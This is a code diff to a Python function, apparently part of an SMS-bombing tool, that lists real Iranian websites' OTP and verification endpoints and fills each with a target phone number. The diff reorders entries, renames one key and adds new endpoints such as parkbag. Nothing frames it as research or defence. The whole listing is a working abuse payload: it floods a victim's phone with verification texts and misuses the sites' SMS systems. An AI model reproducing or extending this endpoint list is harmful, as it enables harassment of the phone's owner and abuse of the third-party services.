@@ -6,10 +6,16 @@ def send_otp_requests(number):
         'shimashoes': ('https://shimashoes.com/api/customer/member/register/', { 'email': '0' + number}),
         'lendo': ('https://api.lendo.ir/api/customer/auth/send-otp', {'mobile': '0' + number}),
         'buskool': ('https://www.buskool.com/send_verification_code', {'phone': '0' + number}),
+        'tamimpishro': ('https://www.tamimpishro.com/site/api/v1/user/otp', {'mobile': '0' + number}),
+        'fafait': ('https://api2.fafait.net/oauth/check-user', {'id': '0' + number}),
         'sheypoor': ('https://www.sheypoor.com/api/v10.0.0/auth/send', {'username': '0' + number}),
         'itoll': ('https://app.itoll.com/api/v1/auth/login', {'mobile': '0' + number}),
         'banimode': ('https://mobapi.banimode.com/api/v2/auth/request', {'phone': '0' + number}),
         'torob': ('https://api.torob.com/v4/user/phone/send-pin', {'phone_number': '0' + number}),
+        'basalam': ('https://auth.basalam.com/otp-request', {'mobile': '0' + number}),
+        'khanoumi': ('https://www.khanoumi.com/accounts/sendotp', {'mobile': '0' + number, 'redirectUrl': ''}),
+        'fankala': ('https://fankala.com/wp-admin/admin-ajax.php', {'action': 'verify_user_login', 'user': '0' + number, 'captcha': ''}),
+        'arastag': ('https://arastag.ir/wp-admin/admin-ajax.php', {'action': 'verify_user_login', 'user': '0' + number, 'captcha': ''}),
         'drdr': ('https://drdr.ir/api/registerEnrollment/verifyMobile', {'phoneNumber': '0' + number, 'userType': 'PATIENT'}),
         'itoll': ('https://app.itoll.ir/api/v1/auth/login', {'mobile': '0' + number}),
         'telewebion': ('https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one', {'code': '98', 'phone': number, 'smsStatus': 'default'}),
@@ -34,12 +40,6 @@ def send_otp_requests(number):
             'ywp_reg_password': 'random_password',
             'ajax_woocommerce_register_nonce': ''
         }),
-        'basalam': ('https://auth.basalam.com/otp-request', {'mobile': '0' + number}),
-        'arastag': ('https://arastag.ir/wp-admin/admin-ajax.php', {'action': 'verify_user_login', 'user': '0' + number, 'captcha': ''}),
-        'tamimpishro': ('https://www.tamimpishro.com/site/api/v1/user/otp', {'mobile': '0' + number}),
-        'fafait': ('https://api2.fafait.net/oauth/check-user', {'id': '0' + number}),
-        'fankala': ('https://fankala.com/wp-admin/admin-ajax.php', {'action': 'verify_user_login', 'user': '0' + number, 'captcha': ''}),
-        'khanoumi': ('https://www.khanoumi.com/accounts/sendotp', {'mobile': '0' + number, 'redirectUrl': ''}),
         'dalfak': ('https://www.dalfak.com/api/auth/sendVerificationCode', {
             'type': 1,
             'value': '0' + number
@@ -86,9 +86,13 @@ def send_otp_requests(number):
             'action': 'bakala_send_code',
             'phone_email': '0'+number,
         }),
-        'maxbax': ('https://shik.style/wp-admin/admin-ajax.php', {
+        'shikstyle': ('https://shik.style/wp-admin/admin-ajax.php', {
             'action': 'login',
             'form=phone': number,
+        }),
+        'parkbag': ('https://parkbag.com/fa/Account/RegisterOrLoginByMobileNumber', {
+            'ReturnUrl': 'https://parkbag.com/',
+            'MobaileNumber': number,
         }),
     }
 
